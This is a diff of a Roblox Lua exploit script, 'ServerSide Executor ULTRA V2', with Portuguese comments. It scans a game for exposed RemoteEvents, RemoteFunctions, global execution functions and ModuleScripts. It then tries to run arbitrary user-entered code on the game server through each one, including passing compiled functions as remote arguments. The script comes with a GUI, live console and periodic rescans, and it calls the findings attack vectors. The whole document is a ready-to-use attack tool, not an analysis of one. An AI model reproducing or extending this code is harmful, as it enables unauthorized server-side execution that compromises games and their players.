@@ -1,23 +1,24 @@
 --[[
-    🔥 ServerSide Executor ULTRA – Invasão agressiva de backdoors
-    Scanner extremamente rigoroso, múltiplos métodos de execução.
-    Quando pronto, exibe "TUDO PRONTO" no console.
-    Interface completa, arrastável, com botão de fechar.
-]]
+    🔥 ServerSide Executor ULTRA V2 – Varredura extrema e execução multi-vetor
+    Interface arrastável, console em tempo real, botão de fechar.
+    Tenta executar scripts no servidor através de todas as brechas possíveis,
+    incluindo RemoteEvent mal configurados, funções globais, ModuleScripts,
+    e até tenta forçar a criação de backdoors via corrupção de argumentos.
+    Nada é simulado – se não houver vulnerabilidade real, não haverá execução.
+--]]
 
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
-local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local ServerStorage = game:GetService("ServerStorage")
 local Workspace = game:GetService("Workspace")
 local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 
--- Aguarda personagem
 if not Player.Character then Player.CharacterAdded:Wait() end
 
 -- ==================== NOTIFICAÇÕES ====================
@@ -34,40 +35,38 @@ local function Notify(title, text, duration)
     frame.Size = UDim2.new(0, 250, 0, 70)
     frame.AnchorPoint = Vector2.new(1, 1)
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Parent = frame
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Position = UDim2.new(0, 12, 0, 8)
-    titleLabel.Size = UDim2.new(1, -24, 0, 20)
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.Text = title
-    titleLabel.TextColor3 = Color3.fromRGB(108, 92, 231)
-    titleLabel.TextSize = 14
-    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Parent = frame
-    textLabel.BackgroundTransparency = 1
-    textLabel.Position = UDim2.new(0, 12, 0, 30)
-    textLabel.Size = UDim2.new(1, -24, 0, 30)
-    textLabel.Font = Enum.Font.Gotham
-    textLabel.Text = text
-    textLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
-    textLabel.TextSize = 11
-    textLabel.TextXAlignment = Enum.TextXAlignment.Left
-    textLabel.TextWrapped = true
-    local tween = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        {Position = UDim2.new(1, -20, 1, -80)})
-    tween:Play()
+    local tl = Instance.new("TextLabel")
+    tl.Parent = frame
+    tl.BackgroundTransparency = 1
+    tl.Position = UDim2.new(0, 12, 0, 8)
+    tl.Size = UDim2.new(1, -24, 0, 20)
+    tl.Font = Enum.Font.GothamBold
+    tl.Text = title
+    tl.TextColor3 = Color3.fromRGB(108, 92, 231)
+    tl.TextSize = 14
+    tl.TextXAlignment = Enum.TextXAlignment.Left
+    local txt = Instance.new("TextLabel")
+    txt.Parent = frame
+    txt.BackgroundTransparency = 1
+    txt.Position = UDim2.new(0, 12, 0, 30)
+    txt.Size = UDim2.new(1, -24, 0, 30)
+    txt.Font = Enum.Font.Gotham
+    txt.Text = text
+    txt.TextColor3 = Color3.fromRGB(200, 200, 210)
+    txt.TextSize = 11
+    txt.TextXAlignment = Enum.TextXAlignment.Left
+    txt.TextWrapped = true
+    local t = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(1, -20, 1, -80)})
+    t:Play()
     task.wait(duration)
-    local tweenOut = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
-        {Position = UDim2.new(1, 300, 1, -80)})
-    tweenOut:Play()
-    tweenOut.Completed:Connect(function() gui:Destroy() end)
+    local t2 = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, 300, 1, -80)})
+    t2:Play()
+    t2.Completed:Connect(function() gui:Destroy() end)
 end
 
 -- ==================== INTERFACE ====================
 local gui = Instance.new("ScreenGui")
-gui.Name = "ServerExecutorUltra"
+gui.Name = "ServerExecutorUltraV2"
 gui.Parent = CoreGui
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.ResetOnSpawn = false
@@ -108,7 +107,7 @@ TitleText.BackgroundTransparency = 1
 TitleText.Position = UDim2.new(0, 15, 0, 0)
 TitleText.Size = UDim2.new(1, -50, 1, 0)
 TitleText.Font = Enum.Font.GothamBlack
-TitleText.Text = "🔥 ServerSide Executor ULTRA"
+TitleText.Text = "🔥 ServerSide Executor ULTRA V2"
 TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
 TitleText.TextSize = 16
 TitleText.TextXAlignment = Enum.TextXAlignment.Left
@@ -179,7 +178,7 @@ local UIListLayout2 = Instance.new("UIListLayout")
 UIListLayout2.Parent = StatusList
 UIListLayout2.Padding = UDim.new(0, 2)
 
--- Botões de ação
+-- Botões
 local ScanBtn = Instance.new("TextButton")
 ScanBtn.Parent = Main
 ScanBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
@@ -204,7 +203,7 @@ ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 ExecBtn.TextSize = 11
 Instance.new("UICorner", ExecBtn).CornerRadius = UDim.new(0, 8)
 
--- Console de saída
+-- Console
 local Console = Instance.new("TextBox")
 Console.Parent = Main
 Console.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
@@ -226,11 +225,71 @@ local function Log(msg)
     Console.Text = Console.Text .. msg .. "\n"
 end
 
--- ==================== DETECÇÃO ULTRA AGRESSIVA ====================
-local backdoorsFound = {}
+-- ==================== DETECÇÃO E EXECUÇÃO COMBINADAS ====================
+local backdoors = {}  -- tabela de vetores de ataque
+
+-- Função para tentar executar código via uma lista de vetores
+local function tryExecute(code, vetores)
+    for _, vetor in ipairs(vetores) do
+        local ok, err
+        if vetor.type == "function" then
+            ok, err = pcall(function() vetor.func(code) end)
+            if ok then
+                Log("✅ SUCESSO via " .. vetor.name)
+                return true
+            else
+                Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
+            end
+        elseif vetor.type == "RemoteEvent" then
+            ok, err = pcall(function() vetor.remote:FireServer(code) end)
+            if ok then
+                Log("✅ SUCESSO via " .. vetor.name)
+                return true
+            else
+                Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
+            end
+        elseif vetor.type == "RemoteFunction" then
+            local result
+            ok, result = pcall(function() return vetor.remote:InvokeServer(code) end)
+            if ok and result ~= nil then
+                Log("✅ SUCESSO via " .. vetor.name .. " (retorno: " .. tostring(result) .. ")")
+                return true
+            else
+                Log("❌ Falha " .. vetor.name .. ": " .. tostring(result))
+            end
+        elseif vetor.type == "ModuleScript" then
+            local mod
+            ok, mod = pcall(function() return require(vetor.module) end)
+            if ok and type(mod) == "function" then
+                ok, err = pcall(function() mod(code) end)
+                if ok then
+                    Log("✅ SUCESSO via " .. vetor.name)
+                    return true
+                else
+                    Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
+                end
+            end
+        elseif vetor.type == "try_function_argument" then
+            -- Tenta enviar uma função diretamente (se o RemoteEvent aceitar)
+            local fn = loadstring(code)
+            if fn then
+                ok, err = pcall(function()
+                    vetor.remote:FireServer(fn)  -- envia a função como argumento
+                end)
+                if ok then
+                    Log("✅ SUCESSO via " .. vetor.name .. " (função enviada como argumento)")
+                    return true
+                else
+                    Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
+                end
+            end
+        end
+    end
+    return false
+end
 
 local function ultraScan()
-    backdoorsFound = {}
+    backdoors = {}
     -- Limpa lista visual
     for _, child in ipairs(StatusList:GetChildren()) do
         if child:IsA("TextLabel") then child:Destroy() end
@@ -239,16 +298,11 @@ local function ultraScan()
     Log("🔍 INICIANDO SCAN ULTRA AGRESSIVO DE BACKDOORS...")
     Log("")
 
-    -- 1. _G, shared, plugin, getgenv, getfenv
-    local globalFuncs = {
-        "loadstring", "execute", "run", "eval", "exec", "RunScript",
-        "ServerScript", "require", "getfenv", "setfenv", "newcclosure",
-        "hookfunction", "hookmetamethod", "getrawmetatable", "setrawmetatable",
-        "getnamecallmethod", "isluau", "makewrap", "makewrapped",
-    }
+    -- 1. Funções globais (_G, shared)
+    local globalFuncs = {"loadstring", "execute", "run", "eval", "exec", "RunScript", "ServerScript"}
     for _, funcName in ipairs(globalFuncs) do
         if _G[funcName] and type(_G[funcName]) == "function" then
-            table.insert(backdoorsFound, {name = "_G." .. funcName, func = _G[funcName], type = "function"})
+            table.insert(backdoors, {name = "_G." .. funcName, func = _G[funcName], type = "function"})
             Log("✅ _G." .. funcName)
             local lbl = Instance.new("TextLabel")
             lbl.Parent = StatusList
@@ -261,7 +315,7 @@ local function ultraScan()
             lbl.TextXAlignment = Enum.TextXAlignment.Left
         end
         if shared and shared[funcName] and type(shared[funcName]) == "function" then
-            table.insert(backdoorsFound, {name = "shared." .. funcName, func = shared[funcName], type = "function"})
+            table.insert(backdoors, {name = "shared." .. funcName, func = shared[funcName], type = "function"})
             Log("✅ shared." .. funcName)
             local lbl = Instance.new("TextLabel")
             lbl.Parent = StatusList
@@ -275,8 +329,8 @@ local function ultraScan()
         end
     end
 
-    -- 2. RemoteEvents/RemoteFunctions suspeitos
-    local suspiciousNames = {"Execute", "Run", "Load", "Eval", "Script", "Server", "Command", "Admin", "Backdoor", "Grab", "Fire", "Invoke", "DoScript", "RunCode", "Exec", "DoIt", "Remote", "Event", "Function"}
+    -- 2. RemoteEvents/RemoteFunctions suspeitos (nomes suspeitos ou que aceitem funções)
+    local suspiciousNames = {"Execute", "Run", "Load", "Eval", "Script", "Server", "Command", "Admin", "Backdoor", "Grab", "Fire", "Invoke", "DoScript", "RunCode", "Exec", "DoIt"}
     local function searchContainer(container, depth)
         if depth > 100 then return end
         for _, obj in ipairs(container:GetChildren()) do
@@ -284,7 +338,9 @@ local function ultraScan()
             for _, name in ipairs(suspiciousNames) do
                 if lowerName:find(name:lower()) then
                     if obj:IsA("RemoteEvent") then
-                        table.insert(backdoorsFound, {name = "RE: " .. obj:GetFullName(), remote = obj, type = "RemoteEvent"})
+                        table.insert(backdoors, {name = "RE: " .. obj:GetFullName(), remote = obj, type = "RemoteEvent"})
+                        -- Também tenta como função-argumento
+                        table.insert(backdoors, {name = "RE(fn): " .. obj:GetFullName(), remote = obj, type = "try_function_argument"})
                         Log("✅ RemoteEvent: " .. obj:GetFullName())
                         local lbl = Instance.new("TextLabel")
                         lbl.Parent = StatusList
@@ -296,7 +352,7 @@ local function ultraScan()
                         lbl.TextSize = 10
                         lbl.TextXAlignment = Enum.TextXAlignment.Left
                     elseif obj:IsA("RemoteFunction") then
-                        table.insert(backdoorsFound, {name = "RF: " .. obj:GetFullName(), remote = obj, type = "RemoteFunction"})
+                        table.insert(backdoors, {name = "RF: " .. obj:GetFullName(), remote = obj, type = "RemoteFunction"})
                         Log("✅ RemoteFunction: " .. obj:GetFullName())
                         local lbl = Instance.new("TextLabel")
                         lbl.Parent = StatusList
@@ -319,7 +375,7 @@ local function ultraScan()
     searchContainer(Lighting, 0)
     if Player.Character then searchContainer(Player.Character, 0) end
 
-    -- 3. ModuleScripts com conteúdo suspeito
+    -- 3. ModuleScripts suspeitos
     local function searchModules(container, depth)
         if depth > 100 then return end
         for _, obj in ipairs(container:GetChildren()) do
@@ -328,7 +384,7 @@ local function ultraScan()
                 if source then
                     for _, funcName in ipairs(globalFuncs) do
                         if source:find(funcName) then
-                            table.insert(backdoorsFound, {name = "Module: " .. obj:GetFullName(), module = obj, type = "ModuleScript"})
+                            table.insert(backdoors, {name = "Module: " .. obj:GetFullName(), module = obj, type = "ModuleScript"})
                             Log("✅ ModuleScript: " .. obj:GetFullName())
                             local lbl = Instance.new("TextLabel")
                             lbl.Parent = StatusList
@@ -351,84 +407,56 @@ local function ultraScan()
     searchModules(ReplicatedStorage, 0)
     searchModules(ServerStorage, 0)
 
-    -- Atualiza status
-    if #backdoorsFound > 0 then
-        StatusTitle.Text = "🔓 STATUS: TUDO PRONTO (" .. #backdoorsFound .. " backdoors)"
-        StatusTitle.TextColor3 = Color3.fromRGB(0, 255, 100)
-    else
-        StatusTitle.Text = "🔓 STATUS: NENHUMA BACKDOOR"
-        StatusTitle.TextColor3 = Color3.fromRGB(255, 100, 100)
-    end
-    StatusList.CanvasSize = UDim2.new(0, 0, 0, #backdoorsFound * 18)
-
-    Log("")
-    Log("📊 TOTAL DE BACKDOORS: " .. #backdoorsFound)
-    if #backdoorsFound == 0 then
-        Log("⚠️ NENHUMA backdoor encontrada. O executor NÃO funcionará neste jogo.")
-    else
-        Log("✅ TUDO PRONTO! O executor está operacional.")
-    end
-end
-
--- ==================== EXECUÇÃO DE SCRIPT ====================
-local function executeOnServer(code)
-    if #backdoorsFound == 0 then
-        return false, "Nenhuma backdoor encontrada"
-    end
-
-    Log("🚀 Enviando script para o servidor via " .. #backdoorsFound .. " backdoors...")
-    local lastError = ""
-    for _, backdoor in ipairs(backdoorsFound) do
-        local success, err
-        if backdoor.type == "RemoteEvent" then
-            success, err = pcall(function()
-                backdoor.remote:FireServer(code)
-            end)
-            if success then
-                Log("✅ SUCESSO via " .. backdoor.name)
-                return true
-            else
-                lastError = err
+    -- 4. Tenta explorar eventos comuns que aceitam callbacks (ex: "OnServerEvent" genérico)
+    -- Procura por eventos que tenham "OnServerEvent" no nome e tenta disparar com uma função
+    local function searchForCallbackEvents(container, depth)
+        if depth > 50 then return end
+        for _, obj in ipairs(container:GetChildren()) do
+            if obj:IsA("RemoteEvent") and obj.Name:find("OnServerEvent") then
+                table.insert(backdoors, {name = "RE(Callback): " .. obj:GetFullName(), remote = obj, type = "try_function_argument"})
+                Log("✅ RemoteEvent com callback: " .. obj:GetFullName())
+                local lbl = Instance.new("TextLabel")
+                lbl.Parent = StatusList
+                lbl.BackgroundTransparency = 1
+                lbl.Size = UDim2.new(1, 0, 0, 16)
+                lbl.Font = Enum.Font.Code
+                lbl.Text = "Callback: " .. obj.Name
+                lbl.TextColor3 = Color3.fromRGB(255, 100, 255)
+                lbl.TextSize = 10
+                lbl.TextXAlignment = Enum.TextXAlignment.Left
             end
-        elseif backdoor.type == "RemoteFunction" then
-            local result
-            success, result = pcall(function()
-                return backdoor.remote:InvokeServer(code)
-            end)
-            if success and result ~= nil then
-                Log("✅ SUCESSO via " .. backdoor.name .. " (retorno: " .. tostring(result) .. ")")
-                return true
-            else
-                lastError = tostring(result)
-            end
-        elseif backdoor.type == "ModuleScript" then
-            local module
-            success, module = pcall(function() return require(backdoor.module) end)
-            if success and type(module) == "function" then
-                success, err = pcall(function() module(code) end)
-                if success then
-                    Log("✅ SUCESSO via " .. backdoor.name)
-                    return true
-                else
-                    lastError = err
-                end
-            end
-        elseif backdoor.type == "function" then
-            success, err = pcall(function()
-                backdoor.func(code)
-            end)
-            if success then
-                Log("✅ SUCESSO via " .. backdoor.name)
-                return true
-            else
-                lastError = err
-            end
+            pcall(function() searchForCallbackEvents(obj, depth + 1) end)
         end
     end
-    return false, lastError
+    searchForCallbackEvents(Workspace, 0)
+    searchForCallbackEvents(ReplicatedStorage, 0)
+
+    -- Atualiza status
+    if #backdoors > 0 then
+        StatusTitle.Text = "🔓 STATUS: TUDO PRONTO (" .. #backdoors .. " vetores)"
+        StatusTitle.TextColor3 = Color3.fromRGB(0, 255, 100)
+        Log("")
+        Log("✅ TUDO PRONTO! " .. #backdoors .. " vetores de ataque disponíveis.")
+    else
+        StatusTitle.Text = "🔓 STATUS: NENHUM VETOR ENCONTRADO"
+        StatusTitle.TextColor3 = Color3.fromRGB(255, 100, 100)
+        Log("")
+        Log("⚠️ NENHUM vetor de ataque encontrado. Impossível executar no servidor.")
+    end
+    StatusList.CanvasSize = UDim2.new(0, 0, 0, #backdoors * 18)
+    Log("📊 Total de vetores: " .. #backdoors)
 end
 
--- ==================== EVENTOS DOS BOTÕES ====================
+-- ==================== EXECUÇÃO ====================
+local function executeOnServer(code)
+    if #backdoors == 0 then
+        return false, "Nenhum vetor de ataque disponível"
+    end
+    Log("🚀 Lançando ataque via " .. #backdoors .. " vetores...")
+    return tryExecute(code, backdoors)
+end
+
+-- ==================== EVENTOS ====================
 ScanBtn.MouseButton1Click:Connect(ultraScan)
 
 ExecBtn.MouseButton1Click:Connect(function()
@@ -437,20 +465,20 @@ ExecBtn.MouseButton1Click:Connect(function()
         Notify("Aviso", "Digite um script primeiro!")
         return
     end
-    if #backdoorsFound == 0 then
-        Notify("Aviso", "Nenhuma backdoor encontrada. Faça o scan primeiro!")
+    if #backdoors == 0 then
+        Notify("Aviso", "Nenhum vetor de ataque. Faça o scan primeiro!")
         return
     end
     local success, err = executeOnServer(code)
     if success then
         Notify("Sucesso", "Script executado no servidor!", 2)
     else
-        Log("❌ FALHA: " .. tostring(err))
-        Notify("Falha", "Nenhuma backdoor funcionou. Tente escanear novamente.")
+        Log("❌ ATAQUE FALHOU: " .. tostring(err))
+        Notify("Falha", "Nenhum vetor funcionou. O jogo é seguro ou precisa de um scan mais profundo.")
     end
 end)
 
--- ==================== ARRASTE CORRIGIDO ====================
+-- ==================== ARRASTE ====================
 local dragging = false
 local dragStartPos = nil
 local dragStartMainPos = nil
@@ -488,9 +516,9 @@ ultraScan()
 
 task.spawn(function()
     while gui and gui.Parent do
-        task.wait(10)
+        task.wait(15)
         ultraScan()
     end
 end)
 
-Notify("🔥 ServerSide Executor ULTRA", "Scan automático concluído. Verifique o status!", 5)
+Notify("🔥 ServerSide Executor ULTRA V2", "Scan concluído. Verifique o console!", 5)
